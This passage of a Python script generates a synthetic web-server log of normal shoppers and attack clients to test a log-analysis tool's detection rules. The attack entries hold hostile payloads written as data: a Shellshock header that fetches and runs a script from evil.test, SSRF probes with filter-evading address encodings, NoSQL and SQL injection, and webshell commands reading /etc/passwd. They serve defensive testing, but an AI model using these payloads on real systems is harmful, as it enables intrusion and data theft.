        "/api/v1/users?filter=%7B%22age%22%3A%7B%22%24ne%22%3Anull%7D%7D",
        "/api/v1/users?filter=%7B%22%24where%22%3A%221%3D%3D1%22%7D",
        "/login?user%5B%24ne%5D=1&pass%5B%24ne%5D=1",
    ):
        write(t, ip, f"GET {probe} HTTP/1.1", 200, 940, agent=CURL)
        t += timedelta(seconds=11)
    for path in ("/cgi-bin/status", "/cgi-bin/test.cgi"):
        write(
            t,
            ip,
            f"GET {path} HTTP/1.1",
            500,
            0,
            agent="() { :; }; /bin/bash -c 'curl http://evil.test/x.sh|sh'",
        )
        t += timedelta(seconds=13)


def headless_client(ip: str, day: int, hour: int) -> None:
    """Sends no User-Agent at all, which no browser does.

    `absent_user_agent` is graded as information rather than as an attack, and
    the distinction is worth having something in the log to point at: this is
    the tool noting an oddity without accusing anybody of anything.
    """
    t = at(day, hour)
    for path in ("/", "/index.php", "/api/v1/feed", "/robots.txt"):
        write(t, ip, f"GET {path} HTTP/1.1", 200, 9_400, agent="-")
        t += timedelta(seconds=16)


def ssrf_attempts(ip: str, day: int, hour: int) -> None:
    """Cloud metadata, loopback, and a file:// scheme no browser would send.

    The last four are the same targets written so a check for them will not
    recognise them: 2852039166 and 0xa9fea9fe are both 169.254.169.254 in one
    integer, `[::ffff:7f00:1]` is loopback as a mapped IPv6 address, and the
    ideographic full stops in the last are not the `.` any pattern looks for.
    They are here because a demonstration that only shows the plain forms shows
    the easy half of the problem.
    """
    t = at(day, hour)
    for probe in (
        "/fetch?url=http%3A//169.254.169.254/latest/meta-data/",
        "/fetch?url=http%3A//127.0.0.1%3A6379/",
        "/fetch?url=file%3A///etc/passwd",
        "/fetch?url=gopher%3A//127.0.0.1%3A11211/_stats",
        # Not an internal address at all — somebody else's server, which is
        # remote file inclusion rather than SSRF-to-self. It is the one probe
        # here that logarc cannot judge on its own: `/fetch?url=` to
        # `https://shop.test/...` would be ordinary, and only knowing that
        # shop.test is this site makes cdn.attacker.test different.
        "/fetch?url=https%3A//cdn.attacker.test/payload.txt",
        "/fetch?target=http%3A//2852039166/latest/meta-data/",
        "/fetch?target=http%3A//0xa9fea9fe/",
        "/fetch?target=http%3A//%5B%3A%3Affff%3A7f00%3A1%5D/",
        "/fetch?target=http%3A//169%E3%80%82254%E3%80%82169%E3%80%82254/",
        # No scheme at all, and the name is the whole evidence. `ssrf_internal_
        # target` above wants `http://` in front and walks past this one.
        "/fetch?target=host.docker.internal/",
    ):
        write(t, ip, f"GET {probe} HTTP/1.1", 502, 0, agent=NUCLEI)
        t += timedelta(seconds=9)


def metadata_probe(ip: str, day: int, hour: int) -> None:
    """Somebody finding out whether the repository is the document root.

    This run is what `project_metadata_probe` was written for, and it replaced
    catching the same thing by its User-Agent — which was evidence of automation
    and was being read as evidence of intent.
    """
    t = at(day, hour)
    write(t, ip, "GET / HTTP/1.1", 200, 24_800, agent=BROWSER)
    t += timedelta(seconds=4)
    write(t, ip, "HEAD / HTTP/1.1", 200, 0, agent=BROWSER)
    t += timedelta(seconds=6)
    for path in (
        "/LICENSE",
        "/.gitignore",
        "/README.md",
        "/CHANGELOG.md",
        "/.well-known/security.txt",
        "/Dockerfile",
        "/.editorconfig",
        "/crossdomain.xml",
    ):
        write(t, ip, f"GET {path} HTTP/1.1", 404, 7_427, agent=BROWSER)
        t += timedelta(seconds=5)


def session_fixation(ip: str, day: int, hour: int) -> None:
    """A session id in the URL, arriving from somebody else's site.

    The rule needs both halves and the log has to carry the `Host` for it to
    work at all — which is the reason this file is `vhost_combined` and not
    plain `combined`. The last line is the control: the same URL shape from the
    site's own page, which must not fire.
    """
    t = at(day, hour)
    for probe, referer in (
        ("/login?sessionid=8a7b6c5d4e3f", "https://free-vouchers.test/claim"),
        ("/login?jsessionid=74B0CB414BD77D17", "https://free-vouchers.test/claim"),
        ("/account?phpsessid=abc123def456", "https://mail.evil.test/message/44"),
    ):
        write(t, ip, f"GET {probe} HTTP/1.1", 200, 8_120, agent=BROWSER, referer=referer)
        t += timedelta(seconds=20)
    write(
        t,
        ip,
        "GET /login?sessionid=8a7b6c5d4e3f HTTP/1.1",
        200,
        8_120,
        agent=BROWSER,
        referer=f"https://{SITE}/cart",
    )


def webshell(ip: str, day: int, hour: int) -> None:
    """Upload, then use. Two activities that only mean something together.

    The double extension is what `webshell_double_extension` reads, and the 200
    on the second request is what makes it serious: it means the file was
    served, not refused.
    """
    t = at(day, hour)
    write(t, ip, "POST /upload HTTP/1.1", 200, 320, agent=CURL)
    t += timedelta(seconds=9)
    write(t, ip, "GET /uploads/avatar.php.jpg HTTP/1.1", 200, 1_840, agent=CURL)
    t += timedelta(seconds=14)
    write(t, ip, "GET /uploads/avatar.php.jpg?cmd=id HTTP/1.1", 200, 96, agent=CURL)
    t += timedelta(seconds=22)
    write(
        t, ip, "GET /uploads/avatar.php.jpg?cmd=cat%20/etc/passwd HTTP/1.1", 200, 2_410, agent=CURL
    )


def scanner_parade(ip: str, day: int, hour: int) -> None:
    """Four tools that do not hide, one request each.

    A default User-Agent is a tool announcing itself, and that is the whole
    claim of the rule that reads them. Kept to one request each so that the
    detection is clearly coming from the name and not from a burst.
    """
    t = at(day, hour)
    for agent in (NIKTO, SQLMAP, NUCLEI, FFUF):
        write(t, ip, "GET /index.php HTTP/1.1", 200, 24_800, agent=agent)
        t += timedelta(seconds=25)


def behaviour_loop(ip: str, day: int, hour: int) -> None:
    """Thirty round trips between two activities.

    Here for one view in particular. The trace draws this as sixty-odd circles
    and tells you almost nothing; the behaviour map draws it as two, with `x30`
    on the arrow between them, and the habit is the finding. It is the clearest
    demonstration of why that second view exists.
    """
    t = at(day, hour)
    for index in range(30):
        write(t, ip, f"GET /admin/users?page={index} HTTP/1.1", 403, 1_180, agent=PYTHON)
        t += timedelta(seconds=8)
        write(t, ip, f"GET /backup-{index}.sql HTTP/1.1", 404, 7_427, agent=PYTHON)
        t += timedelta(seconds=8)


def three_sessions(ip: str, day: int) -> None:
    """One client, three visits, and one visit cut into seven activities.

    This is the client to open when explaining the three levels. The gaps
    between visits are hours, so the sessions are unambiguous; the seventh
    activity inside the middle visit is past the point where the canvas folds a
    session onto a second row, which is the behaviour that is easy to describe
    wrongly and easy to see correctly.
    """
    # Visit one: a look around, nothing more.
    t = at(day, 2, 14)
    t = page(t, ip, "/", agent=CURL)
    write(t, ip, "GET /robots.txt HTTP/1.1", 200, 113, agent=CURL)

    # Visit two, six hours later: seven activities, alternating deliberately so
    # each one is its own episode rather than merging with its neighbour.
    t = at(day, 8, 3)
    for path, status in (
        ("/.env", 404),
        ("/admin/settings", 403),
        ("/wp-login.php", 404),
        ("/api/v1/feed", 200),
        ("/.git/config", 404),
        ("/staff/", 403),
        ("/search?q=oak%27%20OR%201%3D1--%20", 200),
    ):
        for repeat in range(3):
            write(
                t + timedelta(seconds=repeat * 4),
                ip,
                f"GET {path} HTTP/1.1",
                status,
                7_427 if status == 404 else 1_180,
                agent=CURL,
            )
        t += timedelta(seconds=90)

    # Visit three, next morning: gone quiet, one last look.
    t = at(day + 1, 6, 41)
    page(t, ip, "/c/storage", agent=CURL)


# ---------------------------------------------------------------------------
# The cast, in one place. Adding a feature means adding a line here.
# ---------------------------------------------------------------------------


def build() -> None:
    # --- ordinary use, spread across working hours on all three days --------
    for day in (0, 1, 2):
        shopper_who_buys("198.51.100.10", day, 9 + day)
        shopper_who_leaves("198.51.100.11", day, 11)
        returning_customer("198.51.100.12", day, 14)
        window_shopper("198.51.100.13", day, 16)
        mobile_app("198.51.100.14", day, 8)
        price_watcher("203.0.113.50", day, 7)

    shopper_who_buys("198.51.100.15", 1, 20, agent=PHONE)
    shopper_who_leaves("198.51.100.16", 2, 13)
    returning_customer("198.51.100.17", 0, 19)

    crawler("66.249.66.1", GOOGLEBOT, 0, 3, pages=40)
    crawler("66.249.66.1", GOOGLEBOT, 2, 4, pages=25)
    crawler("40.77.167.1", BINGBOT, 1, 2, pages=18)

    signed_in_admin("198.51.100.20", 0, 10)
    signed_in_admin("198.51.100.20", 2, 15)

    # --- attacks, one client each -------------------------------------------
    sqli_campaign("192.0.2.100", 1, 3)
    directory_enumeration("192.0.2.101", 0, 23)
    low_and_slow("192.0.2.102", 1, 5)
    credential_attack("192.0.2.103", 0, 1)
    bulk_registration("192.0.2.112", 2, 2)
    forced_browsing("192.0.2.116", 1, 22)
    server_errors("192.0.2.117", 2, 21)
    path_traversal("192.0.2.104", 0, 4)
    php_attacks("192.0.2.105", 1, 18)
    xss_attempts("192.0.2.106", 2, 6)
    command_injection("192.0.2.107", 0, 17)
    ssrf_attempts("192.0.2.108", 2, 12)
    metadata_probe("192.0.2.109", 1, 1)
    session_fixation("192.0.2.110", 2, 9)
    webshell("192.0.2.111", 1, 20)
    scanner_parade("192.0.2.113", 0, 6)
    behaviour_loop("192.0.2.114", 2, 17)
    three_sessions("192.0.2.115", 0)
    java_attacks("192.0.2.118", 0, 20)
    perl_and_node("192.0.2.121", 1, 15)
    django_orm_probe("192.0.2.122", 2, 14)
    database_fingerprint("192.0.2.123", 0, 15)
    nosql_and_shellshock("192.0.2.119", 2, 4)
    headless_client("192.0.2.120", 1, 11)


#: Lines the parser cannot read, appended after everything else.
#:
#: They are here on purpose. A case that could not read part of its input says
#: so — an amber strip naming how many lines were refused and what share of the
#: file that was — and a reader should see that warning at least once before
#: they meet it on a log that matters. Six out of several hundred keeps the
#: figure small enough to be a demonstration rather than an alarm.
#:
#: Five of the six reach quarantine. The blank line is skipped outright and
#: counted nowhere, which is correct — an empty line is not a line that failed
#: to parse — so the ingest summary reads 5, not 6.
DAMAGED = [
    "this line is not a log line at all",
    'shop.test:443 198.51.100.99 - - [truncated timestamp "GET / HTTP/1.1" 200 100 "-" "-"',
    "",
    'shop.test:443 - - [09/Mar/2026:12:00:00 +0000] "GET /" 200',
    "\x00\x00 binary rubbish where a request line should be",
    'shop.test:443 198.51.100.99 - - [32/Zzz/2026:99:99:99 +0000] "GET / HTTP/1.1" 200 1 "-" "-"',
]


def check() -> int:
    """Report which rules the log exercises, and fail if any is left untouched.

    This is the maintenance promise made executable. The demo log's claim is
    that every feature is reachable from it, and the measurable part of that
    claim is rule coverage — so a rule added to a pack that nothing in this log
    triggers is meant to show up here as a failure, not to be noticed a year
    later when somebody wonders why the demo never mentions it.

    logarc is imported inside this function on purpose. Generating the log needs
    nothing but the standard library, and it should stay that way: the file has
    to be rebuildable even from a checkout where the package will not import.
    """
    from logarc.detect.engine import RuleEngine
    from logarc.detect.rules import load_rules
    from logarc.parsers.registry import get_parser

    root = Path(__file__).resolve().parents[2]
    rules = load_rules([root / "src" / "logarc" / "detect" / "rulepacks"])
    # Built knowing the site's own name, because one rule is deliberately silent
    # until somebody supplies it: `rfi_offsite_url` compares a URL in a
    # parameter against the hosts the reader named, and with nothing named it
    # never fires. Passing SITE here is this log playing the reader who answered
    # — which is also the state the demo is meant to show.
    engine = RuleEngine(rules, site_hosts=(SITE,))
    parser = get_parser("apache-vhost-combined")

    # Grouped by client, because window rules need a client's requests together
    # and in time order — a burst is only a burst relative to its neighbours.
    from collections import defaultdict

    from logarc.core.evidence import EvidenceRef

    by_client = defaultdict(list)
    for number, text in enumerate(OUT.read_text(encoding="utf-8").splitlines(), start=1):
        if not text.strip():
            continue
        try:
            event = parser.parse_line(text, EvidenceRef(OUT.name, number))
        except Exception:  # the damaged lines at the end are meant to fail here
            continue
        if event is not None:
            by_client[event.client_ip].append(event)

    fired: set[str] = set()
    for events in by_client.values():
        for item in engine.label_events(events):
            fired.update(label.rule_id for label in item.all_labels)

    every = {rule.id for rule in rules}
    missing = sorted(every - fired)
    print(f"  {len(fired)} of {len(every)} rules exercised by {OUT.name}")
    if missing:
        print(f"\n  {len(missing)} rule(s) this log never triggers:")
        for name in missing:
            print(f"    {name}")
        print("\n  Add a client to make_demo.py that does, then re-run.")
        return 1
    print("  every rule in every pack is reachable from this log")
    return 0


def main(argv: list[str]) -> int:
    if "--check" in argv:
        return check()

    build()
    lines.sort(key=lambda pair: pair[0])
    body = [text for _, text in lines] + DAMAGED
    # Written as bytes with explicit LF rather than through write_text, which
    # translates newlines to the platform's. That translation made the first
    # committed copy CRLF, so the file's bytes — and therefore the checksum this
    # script prints and the README quotes — depended on who ran it. A server
    # writes LF, `.gitattributes` checks out LF, and a fixture whose digest
    # changes with the operating system is not a fixture.
    OUT.write_bytes(("\n".join(body) + "\n").encode("utf-8"))

    clients = {line.split(" ")[1] for _, line in lines}
    span = lines[-1][0] - lines[0][0]
    print(f"  {OUT}")
    print(f"  {len(body):,} lines ({len(DAMAGED)} deliberately unreadable)")
    print(f"  {len(clients)} clients over {span.days} days {span.seconds // 3600} hours")

    # Recorded as well as printed. Printed, a digest is something the person at
    # the terminal may or may not copy into the README; recorded, it is a file
    # the suite checks on every run. LF for the same reason the log itself is
    # written that way.
    digest = hashlib.sha256(OUT.read_bytes()).hexdigest()
    SUMS.write_bytes(f"{digest}  {OUT.name}\n".encode())
    print(f"  sha256 {digest}")
    print(f"  recorded in {SUMS.name}; update the digest quoted in README.md to match")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
